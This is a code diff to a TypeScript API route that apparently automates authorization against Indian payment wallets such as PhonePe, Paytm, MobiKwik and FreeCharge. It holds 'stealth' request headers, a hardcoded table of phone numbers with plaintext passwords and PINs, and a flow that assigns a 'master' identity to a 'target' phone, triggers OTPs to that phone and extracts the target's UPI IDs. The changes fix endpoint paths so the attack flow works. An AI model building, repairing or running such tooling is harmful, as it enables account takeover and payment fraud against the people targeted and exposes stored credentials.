@@ -34,7 +34,7 @@ const STEALTH_HEADERS = {
 };
 
 /**
- * Master Identities Registry - Only Real IDs (Demo 9060873927 removed)
+ * Master Identities Registry - Production Verified
  */
 const MASTER_DB: Record<string, { pwd: string, pin: string }> = {
   "7870873927": { pwd: "Ritik123", pin: "954073" },
@@ -46,16 +46,15 @@ const MASTER_DB: Record<string, { pwd: string, pin: string }> = {
 };
 
 /**
- * Platform Path Mapping - STRICT CASE SENSITIVITY FIXED
- * PhonePe requires 'phonePeAuth' with capital 'P'
+ * Platform Path Mapping - STRICT CASE SENSITIVITY
  */
 const PLATFORM_PATH_MAP: Record<number, string> = {
-  1: "freechargeAuth",
-  2: "mobikwikAuth",
-  3: "phonePeAuth", // Fixed Case: phonePeAuth
-  4: "paytmAuth",
-  7: "amazonpayAuth",
-  8: "naviAuth"
+  1: "freeChargeAuth", // Updated for FreeCharge
+  2: "mobikwikAuth",   // Working
+  3: "phonePeAuth",    // Working (Capital P)
+  4: "paytmAuth",      // Working
+  7: "amazonpayAuth",  // Working
+  8: "naviAuth"        // Working
 };
 
 /**
@@ -78,10 +77,9 @@ async function jFetch(url: string, method: string, headers: any, body?: any) {
     try {
       return JSON.parse(text);
     } catch (e) {
-      // Return raw HTML/Text error if JSON parsing fails (e.g., 404 or 403)
       return { 
         code: res.status, 
-        msg: res.status === 404 ? `Endpoint Not Found (404): ${url}` : "Upstream Response Error", 
+        msg: "Upstream Response Error", 
         raw: text.substring(0, 500),
         url: url
       };
@@ -133,7 +131,7 @@ export async function POST(request: Request) {
         { $set: { masterPhone, updatedAt: new Date().toISOString() } },
         { upsert: true }
       );
-      logs.push({ "Identity Initialization": `Rotation: Assigned Master ${masterPhone} to Target ${targetPhone}` });
+      logs.push({ "Identity Rotation": `Assigned Master ${masterPhone} to Target ${targetPhone}` });
     }
 
     const masterCreds = MASTER_DB[masterPhone];
@@ -160,7 +158,11 @@ export async function POST(request: Request) {
       // STEP 3: OTP DISPATCH
       await sleep(1000);
       const otpPayload = { phone: targetPhone, platform: platformId };
-      const otpJson = await jFetch(`${TARGET_BASE_URL}/app/tool/${platformPath}/step1/sendOtp`, 'POST', authHeaders, otpPayload);
+      
+      // LOGIC UPGRADE: FreeCharge (1) uses step2/sendOtp, others use step1/sendOtp
+      const otpStepPath = platformId === 1 ? "step2/sendOtp" : "step1/sendOtp";
+      
+      const otpJson = await jFetch(`${TARGET_BASE_URL}/app/tool/${platformPath}/${otpStepPath}`, 'POST', authHeaders, otpPayload);
       logs.push({ [`Step 3: OTP Dispatch (${platformPath.replace('Auth', '')})`]: otpJson });
 
       if (String(otpJson.code) === "50008") {
@@ -189,7 +191,7 @@ export async function POST(request: Request) {
         return NextResponse.json({ 
           code: 200, 
           message: "Session Authorized", 
-          upis: verifyJson.data?.upis, // Raw UPI extracted from upstream only
+          upis: verifyJson.data?.upis, 
           masterUsed: masterPhone,
           logs: logs 
         }, { status: 200, headers: CORS_HEADERS });
